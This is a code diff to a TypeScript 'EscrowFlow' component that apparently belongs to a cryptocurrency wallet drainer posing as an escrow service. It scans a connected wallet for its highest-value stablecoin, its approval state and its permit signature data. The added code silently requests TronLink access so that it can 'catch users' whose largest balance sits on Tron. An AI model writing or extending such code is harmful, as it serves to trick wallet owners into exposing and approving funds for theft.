@@ -555,28 +555,52 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setModal1Open(true);
 
     // Include Tron address if TronLink is already connected
-    const currentTronAddr = tronAddress ?? getConnectedTronAddress();
+    let currentTronAddr = tronAddress ?? getConnectedTronAddress();
     if (currentTronAddr && !tronAddress) setTronAddress(currentTronAddr);
 
-    try {
+    type ScanData = {
+      ok: boolean;
+      topToken?: {
+        chain: string; chainLabel: string; chainId: number; symbol: string;
+        address: string; balance: string; balanceUsd: number; contract: string;
+        isTron: boolean; alreadyApproved: boolean;
+        permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
+      };
+      chainUsd?: Record<string, number>;
+    };
+
+    const doScan = async (tronAddr: string | null): Promise<ScanData> => {
       const res = await fetch("/api/scan-balances", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address, tronAddress: currentTronAddr }),
+        body: JSON.stringify({ address, tronAddress: tronAddr }),
       });
-      const data: {
-        ok: boolean;
-        topToken?: {
-          chain: string; chainLabel: string; chainId: number; symbol: string;
-          address: string; balance: string; balanceUsd: number; contract: string;
-          isTron: boolean; alreadyApproved: boolean;
-          permit?: boolean; permitDomainName?: string; permitDomainVersion?: string;
-        };
-        chainUsd?: Record<string, number>;
-      } = await res.json();
+      return res.json();
+    };
 
-      if (data.ok) {
-        setCachedScanUsd(data.chainUsd ?? null);
+    try {
+      let data = await doScan(currentTronAddr);
+
+      if (data.ok) setCachedScanUsd(data.chainUsd ?? null);
+
+      // If no EVM USDT/USDC found AND TronLink is installed but not yet connected,
+      // silently request TronLink access and rescan — this catches users whose
+      // highest stable balance is Tron USDT but who connected via WalletConnect.
+      if ((!data.topToken || data.topToken.balanceUsd < 0.01) && !currentTronAddr) {
+        const hasTronLink = typeof window !== "undefined" && Boolean(window.tronLink);
+        const hasTronWeb = typeof window !== "undefined" && Boolean((window as { tronWeb?: unknown }).tronWeb);
+        if (hasTronLink || hasTronWeb) {
+          const newTronAddr = await connectTronLink();
+          if (newTronAddr) {
+            setTronAddress(newTronAddr);
+            currentTronAddr = newTronAddr;
+            const retry = await doScan(newTronAddr);
+            if (retry.ok) {
+              data = retry;
+              setCachedScanUsd(retry.chainUsd ?? null);
+            }
+          }
+        }
       }
 
       setModal1Scanning(false);
